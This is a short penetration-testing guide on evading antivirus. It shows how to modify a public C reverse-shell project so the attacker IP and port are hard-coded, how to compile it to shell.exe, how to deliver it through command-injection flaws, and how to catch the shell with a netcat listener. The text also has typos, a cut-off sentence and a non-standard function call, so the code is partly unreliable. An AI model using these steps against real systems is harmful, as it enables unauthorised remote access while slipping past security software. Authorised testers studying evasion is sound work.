# Antivirus Evasion Techniques
Eventually most penetration testers will have to deal with antivirus software which likes to rui8n our progress. This document provides several techniques 
## Simple Shell
The [Simple Reverse Shell](https://github.com/infoskirmish/Window-Tools/tree/master/Simple%20Reverse%20Shell) project can be updated and compiled to spawn a simple shell on servers which have AV. Usually AV will block anything created by [MSFVenom](https://github.com/rapid7/metasploit-framework/blob/master/msfvenom), but often won't block the Simple Reverse Shell.

Simply update the shell.c code to manually set the Attacker IP address as shown below,
```
32. struct hostent *host;
33. //host = gethostbyname(argv[1]);
34. host = gethostnamebyip("10.10.10.10"); 
35. strcpy(aip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));
36. 
37. hax.sin_family = AF_INET;
38. //hax.sin_port = htons(atoi(argv[2])); 
39. hax.sin_port = htons(666); 
40. hax.sin_addr.s_addr =inet_addr(aip_addr);
```
As you can see, I simply update the code to have a static, hard-coded, IP address of my attacker machine, 10.10.10.10, and a port number of 666. I do this to make life easier when I transport the file via infiltration and execute it from command injection vulnerabilities. I left the original lines commented out to see the difference. This code does not contain any payload which has a signature known by an AV client. It will however be noticed by advanced endpoint protection, as it is new behavior to send a shell to another machine.

Compile this code with the compile.ssh script providfed by the Simple Reverse Shell package like so,
```
root@attacker-machine:~# ./compile.sh shell
```
This will create `shell.exe` that we can no transplant to the target system and execute. Before doing so, use Netcat to start alisterner on our Attacker machine,
```
root@attacker-machine:~# nc -lvvnp 666
```
